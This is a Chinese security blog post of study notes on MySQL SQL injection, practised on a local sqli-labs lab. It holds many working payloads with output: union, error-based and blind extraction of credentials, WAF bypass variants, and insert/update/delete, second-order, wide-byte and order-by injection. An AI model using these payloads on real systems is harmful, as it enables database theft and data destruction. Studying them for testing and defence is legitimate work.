@@ -1,0 +1,977 @@
+<!-- build time:Sun Jul 11 2021 19:49:21 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="Be malicious" href="https://self-ferry.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="Be malicious" href="https://self-ferry.github.io/atom.xml"><link rel="alternate" type="application/json" title="Be malicious" href="https://self-ferry.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="sql注入"><link rel="canonical" href="https://self-ferry.github.io/%E5%86%8D%E5%AD%A6SQLinjection/"><title>再学SQLinjection - web安全 | Be malicious = Till I no longer can</title><meta name="generator" content="Hexo 5.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">再学SQLinjection</h1><div class="meta"><span class="item" title="创建时间：2020-12-07 11:27:26"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2020-12-07T11:27:26+08:00">2020-12-07</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>32k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>29 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Be malicious</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeyvx1d4j20zk0m8hdt.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicivghyooj20zk0m8dir.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclj61ylzj20zk0m8b29.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipet4bz0yj20zk0m8e81.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li><li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipevuctzzj20zk0m84qp.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web-security/" itemprop="item" rel="index" title="分类于 web安全"><span itemprop="name">web安全</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://self-ferry.github.io/%E5%86%8D%E5%AD%A6SQLinjection/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Or0kit"><meta itemprop="description" content="Till I no longer can, 临渊羡鱼，不如退而结网"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Be malicious"></span><div class="body md" itemprop="articleBody"><p><img data-src="/images/bimg/%E9%98%BF%E5%B0%94%E7%93%A6%E6%8B%89%E8%BE%9B%EF%BC%8C%E8%A5%BF%E7%8F%AD%E7%89%99.jpg" alt=""></p><h1 id="前言"><a class="anchor" href="#前言">#</a> 前言</h1><blockquote><p>接着深入学习 SQL 注入。本文源自某位前辈的笔记，author：404</p></blockquote><h1 id="0x00-注入的产生"><a class="anchor" href="#0x00-注入的产生">#</a> 0x00 注入的产生</h1><ol><li><p>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</p></li><li><p>过滤不严格。</p></li><li><p>数据库配置不当。</p></li><li><p>转义不当。</p></li></ol><h1 id="0x01-注入的类型"><a class="anchor" href="#0x01-注入的类型">#</a> 0x01 注入的类型</h1><p>常见的注入我们可以归纳为数字型，字符型，搜索型，盲注等。</p><pre><code>select * from admin where id = $id; //数字型 注入
+
+select * from admin where id = '$id'; //字符型
+
+select * from admin where id = &quot;$id&quot;;
+
+select * from admin where id = ($id);
+
+select * from admin where id = ('$id');
+
+select * from admin where id = (&quot;$id&quot;);
+
+select * from admin where username  like '%adm%';
+
+select * from admin where username  like ('%adm%');
+
+select * from admin where id = $id limit 0,1;
+
+select * from admin order by $id;
+
+select * from admin order by limit 0,1 $id;
+
+select * from admin order by id limit 1,1 $id;
+
+insert注入
+
+update注入
+
+delete注入
+
+二次注入
+
+等等
+
+</code></pre><p>实际环境中我们可能还会遇到更为复杂的 sql 注入语句，我们就要想办法闭合它。</p><h1 id="0x03-寻找注入的一些注意"><a class="anchor" href="#0x03-寻找注入的一些注意">#</a> 0x03 寻找注入的一些注意</h1><p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的 fuzz 上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入，<br>但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p><ol><li><p>当网站为成熟的 cms 框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</p></li><li><p>判断为自己开发的系统，目标不是很重要可以尝试使用 AWVS 等工具。</p></li><li><p>信息收集的重要性，可能它的源码就在 GitHub 上，或者一个备份文件。</p></li></ol><h1 id="0x00-数据库版本收集与路径"><a class="anchor" href="#0x00-数据库版本收集与路径">#</a> 0x00 数据库版本收集与路径</h1><p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到 <code>version()</code> <code>@@version</code> <code>/*!版本号*/</code></p><p><code>/*!*/</code> 意为在 xxx 版本之上执行 我的版本是 5.6 所以可以执行</p><pre><code>mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,version(),3;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | admin    | admin    |
+|    1 | 5.6.30-1 | 3        |
++------+----------+----------+
+2 rows in set (0.00 sec)
+
+mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,@@version,3;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | admin    | admin    |
+|    1 | 5.6.30-1 | 3        |
++------+----------+----------+
+2 rows in set (0.01 sec)
+
+mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,/*!40000 user()*/,3;
++------+----------------+----------+
+| id   | username       | password |
++------+----------------+----------+
+|    1 | admin          | admin    |
+|    1 | root@localhost | 3        |
++------+----------------+----------+
+2 rows in set (0.00 sec)
+
+</code></pre><p>路径的话一般用 <code>@@datadir</code> 就可以了然后大概反猜下网站路径 操作系统 <code>@@version_compile_os</code></p><h1 id="0x01-用户链接信息"><a class="anchor" href="#0x01-用户链接信息">#</a> 0x01 用户，链接信息</h1><p><code>system_user()</code> // 系统用户名<br><code>user()</code> // 用户名<br><code>current_user()</code> // 当前用户名<br><code>session_user()</code> // 链接数据库的用户名</p><pre><code>mysql&gt; select * from users where id =1 union select system_user(),session_user(),current_user();
++--------------------+--------------------+----------+
+| id                 | username           | password |
++--------------------+--------------------+----------+
+| 1                  | Dumb               | Dumb     |
+| root@192.168.1.101 | root@192.168.1.101 | root@%   |
++--------------------+--------------------+----------+
+2 rows in set (0.00 sec)
+
+</code></pre><p>读取 host 与 user</p><pre><code>mysql&gt; select * from users where id =1 union select 1,host,user from mysql.user;
++----+-----------+----------+
+| id | username  | password |
++----+-----------+----------+
+|  1 | Dumb      | Dumb     |
+|  1 | %         | root     |
+|  1 | 127.0.0.1 | root     |
+|  1 | ::1       | root     |
+|  1 | localhost | root     |
++----+-----------+----------+
+5 rows in set (0.00 sec)
+
+</code></pre><h1 id="0x02-文末"><a class="anchor" href="#0x02-文末">#</a> 0x02 文末</h1><p>通过以上信息还能大概判断下是不是站库分离之类的</p><h1 id="0x00-初识注入-bypass"><a class="anchor" href="#0x00-初识注入-bypass">#</a> 0x00 初识注入 bypass</h1><p>在 MySQL 里面注入和搭建环境来其实差不多，推荐使用 sqli-labs 来练练手，网上一堆的方法也是我们从学以来用到的</p><p>加引号 报错 <code>and 1=1</code> <code>and 1=2</code> 然后 SQLmap 一丢有 waf 就凉凉，可能 and 的时候就凉了，所以手工是也算个必修课吧。</p><p>直接用 <code>and 1=1</code> 一类的多属于 数字型注入 <code>select * from admin where id = $id;</code> 被包裹起来的就不行的，所以<br>一般要看报错的语句，当然也不是加个引号没报错就没了，具体分很多情况的。（废话多了点顺便讲清楚吧）</p><h1 id="0x01-第一个注入"><a class="anchor" href="#0x01-第一个注入">#</a> 0x01 第一个注入</h1><p>and 是一个逻辑符号 要求两边同时成立，所以 and 这边是什么可以尽情发挥大家的才能 比如 and true=1 ？，为什么要这么写，因为某狗判断的就是 and 这边的字符类型<br>大家可以去了解了解 MySQL 隐式转化。</p><pre><code>mysql&gt; select * from users where id = &quot;1&quot; and 1=1;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users where id = &quot;1&quot; and 1=2;
+Empty set (0.00 sec)
+
+</code></pre><p>说了这么多我们就拿 sqli-labs 的第一关来演示一下</p><p><img data-src="1.6.1.png" alt="mysql"></p><p>看到报错语句</p><pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+
+</code></pre><p>其中 <code>''1'' LIMIT 0,1'</code> 最外层的是它出错给你的字符串不用看，所以为 <code>'1'' LIMIT 0,1</code> 应为我们的单引号没闭合所以造成了出错 同时知道了 它的后面有个 <code>LIMIT 0,1</code> 所以反推大概的语句为 <code>select x,x from xxx where x='id' limit 0,1</code> 看到报错信息我们应该要能反推它的语句，有利于我们进一步注入，下面使用联合注入。</p><p>首先都是老套路 <code>order by xx</code> 来判断它的列数，因为 <code>order by</code> 是根据列来排序的 （排序第几列）</p><pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- +
+
+</code></pre><p>通过 limit 0,1 来控制前端的显位的数据 (从第 0 条取一条) 如果是过滤逗号 。 想用分页可以使用 <code>1 offset 1</code> 意思是从第 1 条开始选一条当然还有 join 分页这些都在后面讲了。</p><pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +
+</code></pre><p>当然你想直接爆当前的库的表 不妨这样写 <code>table_schema=database()</code> 为了避免单引号你也可以使用 hex 后的数据 <code>table_schema=0x7365637572697479</code></p><p>使用 <code>group_concat()</code> 函数把表名都聚合起来，更加方便。</p><pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -- +
+</code></pre><p>爆出字段</p><pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(username,0x7C,password),3 from users-- +
+
+</code></pre><p>爆出数据 在 <code>group_concat()</code> 被过滤的情况下我们可以使用其他的来替换 推荐大家查阅 mysql 函数表</p><p>当我们使用 <code>information_schema.schemata</code> 时被拦截了，我们可以这样绕过</p><pre><code>
+`information_schema`.`schemata `
+information_schema/**/.schemata
+information_schema/*!*/.schemata
+information_schema%0a.schemata
+
+</code></pre><p>也有人遇到过这种情况 users 表被拦截 怎么绕过呢，其实也一样</p><pre><code>security.users 数据库名 加表名
+
+security.`users`
+
+</code></pre><h1 id="0x00-报错注入"><a class="anchor" href="#0x00-报错注入">#</a> 0x00 报错注入</h1><p>报错注入在我们不能联合注入的时候也是非常重要的网上给我们提供了很多中报错注入 这里直接引用<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd29jYWxpZXNoZW5tZWd1aS9wLzU5MTc5NjcuaHRtbA==">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</span> 一文了</p><pre><code>1.floor()
+
+select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+
+2.extractvalue()
+
+select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+
+
+3.updatexml()
+
+select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+
+
+4.geometrycollection()
+
+select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+
+
+5.multipoint()
+
+select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+
+
+6.polygon()
+
+select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+
+
+7.multipolygon()
+
+select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+
+
+8.linestring()
+
+select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+
+
+9.multilinestring()
+
+select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+
+10.exp()
+
+select * from test where id=1 and exp(~(select * from(select user())a));
+
+</code></pre><p>每个一个报错语句都有它的原理 比如 <code>exp()</code> 报错的原理，手册说到 exp 是一个数学函数 取 e 的 x 次方，当我们输入的值大于 709 就会报错 然后～取反它的值总会大于 709 所以报错。</p><p>简单的用报错语句来注入一下把这里我就利用函数 <code>updatexml()</code></p><pre><code>updatexml (XML_document, XPath_string, new_value); 
+XML_document: 是String格式，为XML文档对象的名称，文中为Doc 
+XPath_string : Xpath
+new_value :String格式，替换查找到的符合条件的数据 
+
+</code></pre><p>其中关键点就是 <code>XPath_string</code> 这块了 因为我们传入的的不是 <code>XPath_string</code> , 为什么要使用 <code>concat</code> 这个函数呢，因为它是个连接函数你不用的话 <code>(updatexml(1,(select user()),1))</code> 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到 <code>concat</code> 用特殊字符给他连接起来。</p><pre><code>爆库：
+
+http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +
+
+爆表：
+
+http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +
+
+爆字段：
+
+http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +
+
+爆数据：
+
+http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +
+
+
+
+</code></pre><p>在报错里面直接使用 MySQL 最基本的查表就可以了，你也可以把 concat 放在外面 <code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p><p>自己灵活多变，这里我值得注意的是它加了连接字符 md5 只能爆出 31 位，你可以用分割函数分割出来。</p><pre><code>substr(string string,num start,num length);
+
+string为字符串
+
+start为起始位置
+
+length为长度
+
+http://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +
+
+
+
+</code></pre><p>因为我密码不是 md5 的 所以我加了个密来分割。</p><h1 id="0x00-盲注"><a class="anchor" href="#0x00-盲注">#</a> 0x00 盲注</h1><p>盲注我这里只归纳为</p><ol><li><p>时间盲注</p></li><li><p>布尔盲注</p></li></ol><p>其实在如今的实际环境中一般盲注的情况毕竟多，时间盲注太费时间 同时对网络要求比较高，二分，dnslog, 等等可以加快注入的进程。</p><h1 id="0x01-盲注中值得注意的问题"><a class="anchor" href="#0x01-盲注中值得注意的问题">#</a> 0x01 盲注中值得注意的问题</h1><ol><li><p>盲注中使用 and 你得确定你查询的值得存在 。</p></li><li><p>在返回多组数据的情况下，你的延时不再是 单纯的 <code>sleep(5)</code> 他将根据你返回的数据条数来反复执行</p></li><li><p>在如同搜索型时尽量搜索存在且数目较少的关键词</p></li><li><p>尽量不要使用 or</p></li></ol><p>至于以上为什么会出现这种原因 推荐大家看看 这篇文章讲的很清楚 https://www.t00ls.net/thread-45590-1-10.html</p><h1 id="0x02-简单时间盲注"><a class="anchor" href="#0x02-简单时间盲注">#</a> 0x02 简单时间盲注</h1><p>时间盲注也叫延时注入 一般用到函数 <code>sleep()</code> <code>BENCHMARK()</code> 还可以使用笛卡尔积 (尽量不要使用，内容太多会很慢很慢), 查阅 mysql 手册会发现很多东西</p><p>一般时间盲注我们还需要使用条件判断函数</p><h2 id="if"><a class="anchor" href="#if">#</a> if()</h2><p><code>if（expre1，expre2，expre3）</code> 当 expre1 为 true 时，返回 expre2，false 时，返回 expre3<br>盲注的同时也配合着 mysql 提供的分割函，与正则函数 like 函数，比较函数等等，还是那句话多看手册。</p><pre><code>substr
+substring
+left
+......
+
+</code></pre><p>我们一般喜欢把分割的函数编码一下，当然不编码也行，编码的好处就是可以不用引号 常用到的就有 <code>ascii()</code> <code>hex()</code> 等等<br><code>benchmark()</code> 其作用是来测试一些函数的执行速度。benchmark () 中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。</p><pre><code>mysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r'),sleep(5),1);
+Empty set (5.01 sec)
+
+mysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r1'),sleep(5),1);
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users where id =1 and if((substr((select user()),1,1)='r'),BENCHMARK(20000000,md5('a')),1);
+Empty set (5.15 sec)
+
+</code></pre><h2 id="case-when-then-else-end"><a class="anchor" href="#case-when-then-else-end">#</a> case when then else end</h2><pre><code>mysql&gt; select * from users where id =1 and case when (substr((select user()),1,1)=&quot;rr&quot;) then sleep(3) else 1 end;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users where id =1 and case when (substr((select user()),1,1)=&quot;r&quot;) then sleep(3) else 1 end;
+Empty set (3.00 sec)
+
+</code></pre><p>不推荐使用笛卡尔积当数据过多时会造成 DOS。</p><h1 id="0x03-布尔盲注"><a class="anchor" href="#0x03-布尔盲注">#</a> 0x03 布尔盲注</h1><p>盲注思路的思路很多 比如正则匹配，比较函数，运算符，推荐大家可以看看<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTcwNjI2">https://www.anquanke.com/post/id/170626</span></p><ol><li>直接通过字符串截取对比，类似函数很多后面做个总结吧</li></ol><pre><code>http://127.0.0.1/sqli/Less-1/?id=1' and substr((select user()),1,1)='r' -- +
+</code></pre><ol start="2"><li>用 <code>IFNULL()</code> 函数</li></ol><pre><code>http://127.0.0.1/sqli/Less-1/?id=1' and IFNULL((substr((select user()),1,1)='r'),0) -- +
+
+</code></pre><ol start="3"><li>使用 比较函数 <code>strcmp()</code></li></ol><pre><code>1.
+
+http://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),1) -- +
+http://127.0.0.1/sqli/Less-1/?id=1' and strcmp((substr((select user()),1,1)='r'),0) -- +
+
+
+2.
+
+mysql&gt; select * from users where id =1 and 0=strcmp((substr((select user()),1,1)),'o');
+Empty set (0.00 sec)
+
+mysql&gt; select * from users where id =1 and 0=strcmp((substr((select user()),2,1)),'o');
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | Dumb     | Dumb     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+
+</code></pre><h1 id="0x04-小技巧"><a class="anchor" href="#0x04-小技巧">#</a> 0x04 小技巧</h1><p>在没有办法的情况下必须使用到 or 的延时注入不如试试子查询，他也只将延时 5s</p><pre><code>http://192.168.130.135/Less-1/?id=1'  or if((substr((select user()),1,1)='r'),((select sleep(5) from information_schema.schemata as b)),1);-- +
+
+</code></pre><h1 id="0x00-insertdeleteupdate-注入"><a class="anchor" href="#0x00-insertdeleteupdate-注入">#</a> 0x00 insert,delete,update 注入</h1><p>insert,delete,update 主要是用到盲注和报错注入，此类注入点不建议使用 sqlmap 等工具，会造成大量垃圾数据，和其他情况。</p><h1 id="0x01-insertdeleteupdate"><a class="anchor" href="#0x01-insertdeleteupdate">#</a> 0x01 insert,delete,update</h1><h2 id="insert"><a class="anchor" href="#insert">#</a> insert</h2><p>可以看到假如没闭合是会产生很多垃圾数据的，所以这类注入建议手工或者自己写工具。</p><p>一般这种注入会出现在 注册、ip 头、留言板等等需要写入数据的地方，同时这种注入不报错一般较难发现。</p><ol><li>报错</li></ol><pre><code>mysql&gt; insert into admin (id,username,password) values (2,&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;,&quot;admin&quot;);
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; select * from admin;
++------+-----------------------------------------------+----------+
+| id   | username                                      | password |
++------+-----------------------------------------------+----------+
+|    1 | admin                                         | admin    |
+|    1 | and 1=1                                       | admin    |
+|    2 | or updatexml(1,concat(0x7e,(version())),0) or | admin    |
++------+-----------------------------------------------+----------+
+3 rows in set (0.00 sec)
+
+mysql&gt; insert into admin (id,username,password) values (2,&quot;&quot;or updatexml(1,concat(0x7e,(version())),0) or&quot;&quot;,&quot;admin&quot;);
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'
+
+</code></pre><ol start="2"><li>盲注</li></ol><p>int 型 可以使用 运算符 比如 加减乘除 and or 异或 移位等等</p><pre><code>mysql&gt; insert into admin values (2+if((substr((select user()),1,1)='r'),sleep(5),1),'1',&quot;admin&quot;);
+Query OK, 1 row affected (5.00 sec)
+
+mysql&gt; insert into admin values (2+if((substr((select user()),1,1)='p'),sleep(5),1),'1',&quot;admin&quot;);
+Query OK, 1 row affected (0.00 sec)
+
+</code></pre><p>字符型注意闭合不能使用 and</p><pre><code>mysql&gt; insert into admin values (2,''+if((substr((select user()),1,1)='p'),sleep(5),1)+'',&quot;admin&quot;);
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; insert into admin values (2,''+if((substr((select user()),1,1)='r'),sleep(5),1)+'',&quot;admin&quot;);
+Query OK, 1 row affected (5.01 sec)
+
+</code></pre><p>注意盲注产生大量垃圾数据。</p><h2 id="delete"><a class="anchor" href="#delete">#</a> delete</h2><p>报错注入同上</p><p>值得注意的时 delete 注入很危险，很危险，很危险。</p><p>语句不当 将会亲人泪两行 <code>or 1=1</code> 因为 1=1 为 true 所以每一行被删除了，他以前用 sqlmap 一把梭 现在过的很好，每顿都有人送饭到手上。</p><p>所以在 delete 注入时使用 or 一定要为 false</p><pre><code>mysql&gt; delete from admin where id =3 or 1=1;
+Query OK, 4 rows affected (0.00 sec)
+
+</code></pre><p>报错注入</p><pre><code>mysql&gt; delete from admin where id =-2 or updatexml(1,concat(0x7e,(version())),0);
+ERROR 1105 (HY000): XPATH syntax error: '~5.5.53'
+
+
+
+</code></pre><p>盲注</p><p>or 配上 <code>if()</code> 函数使用不当 再提下 if (expr1,expr2,expr3)，如果 expr1 的值为 true，返回 expr2 的值，如果 expr1 的值为 false，<br>返回 expr3 的值。</p><pre><code>mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),1);
+Query OK, 3 rows affected (0.00 sec)
+
+</code></pre><p>所以 delete 中 or 的正确使用方法 (or 右边要为 false)</p><pre><code>mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r4'),sleep(5),0);
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; delete from admin where id =-2 or if((substr((select user()),1,1)='r'),sleep(5),0);
+Query OK, 0 rows affected (5.00 sec)
+
+</code></pre><h2 id="update"><a class="anchor" href="#update">#</a> update</h2><p>与上面的类似</p><pre><code>mysql&gt; select * from admin;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | 1        | admin    |
+|    2 | 1        | admin    |
+|    2 | 1        | admin    |
+|    2 | admin    | admin    |
++------+----------+----------+
+4 rows in set (0.00 sec)
+
+mysql&gt; update admin set id=&quot;5&quot;+sleep(5)+&quot;&quot; where id=2;
+Query OK, 4 rows affected (20.00 sec)
+Rows matched: 4  Changed: 4  Warnings: 0
+</code></pre><h1 id="0x02-文末-2"><a class="anchor" href="#0x02-文末-2">#</a> 0x02 文末</h1><p>update，insert 注入怎么找，我们可以尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入</p><h1 id="0x00-二次注入"><a class="anchor" href="#0x00-二次注入">#</a> 0x00 二次注入</h1><p>二次注入的原理是 sql 语句没有被转义直接存入数据库，然后在被读取查询而导致的。</p><p>二次注入在 php 种通常见于，插入时被 <code>addslashes()</code> <code>get_magic_quotes_gpc</code> 等等转义，但是写入数据库时还是使用原来的数据，二次注入造成原因时多种多样的。</p><p>在没有被单引号包裹的 sql 语句下，我们可以用 16 进制编码他，这样就不会带有单引号等。</p><pre><code>mysql&gt; insert into admin (id,name,pass) values ('3',0x61646D696E27313131,'11');
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; select * from admin;
++----+-----------+-------+
+| id | name      | pass  |
++----+-----------+-------+
+|  1 | admin     | admin |
+|  2 | admin'111 | 11111 |
+|  3 | admin'111 | 11    |
++----+-----------+-------+
+4 rows in set (0.00 sec)
+
+</code></pre><p>想要具体了解这个 大家可以做做 sqli-labs 24 课，二次注入在没有源码的情况比较难发现，通常见于注册，</p><h1 id="0x01-宽字节注入"><a class="anchor" href="#0x01-宽字节注入">#</a> 0x01 宽字节注入</h1><pre><code>1.没使用宽字节
+%27 -&gt; %5C%27
+
+2. 试用宽字节
+
+%df%27 -&gt; %df%5c%27 -&gt; 運'
+</code></pre><ol><li><p>在我们输入单引号时 <code>addslashes()</code> 或者 <code>get_magic_quotes_gpc</code> 给我们的单引号加入了转义字符 <code>\</code> 就变成了 <code>\'</code></p></li><li><p>我们输入经过转换后由于编码的不同把 <code>%df%5c</code> 转换为了一个汉字。</p></li></ol><p>想要具体了解找个的可以 做做 sqli-labs 33 课</p><h1 id="0x00-order-by-注入"><a class="anchor" href="#0x00-order-by-注入">#</a> 0x00 order by 注入</h1><p>这是一种特殊的注入 sql 语句为 <code>select * from admin order by $id</code> 我们一般用 order by 来判断他的列数，其实他就是一个依照第几个列来排序的过程。</p><p>order by 注入是不能 直接使用 <code>and 1=1</code> 来判断的，他需要用到条件语句。</p><pre><code>mysql&gt; select * from admin order by id;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+mysql&gt; select * from admin order by username;
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+</code></pre><h2 id="盲注"><a class="anchor" href="#盲注">#</a> 盲注</h2><ol><li>布尔</li></ol><p>简单的判断</p><pre><code>mysql&gt; select * from admin order by if(1=1,username,password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
+|    1 | cdmin    | bdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+mysql&gt; select * from admin order by if(1=3,username,password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
+</code></pre><p>简单的注入</p><pre><code>mysql&gt; select * from admin order by if((substr((select user()),1,1)='r1'),username,password);
++------+----------+----------+
+| id   | username | password |
++------+----------+----------+
+|    1 | cdmin    | bdmin    |
+|    2 | admin    | ddmin    |
+|    3 | bdmin    | fdmin    |
++------+----------+----------+
+3 rows in set (0.00 sec)
+
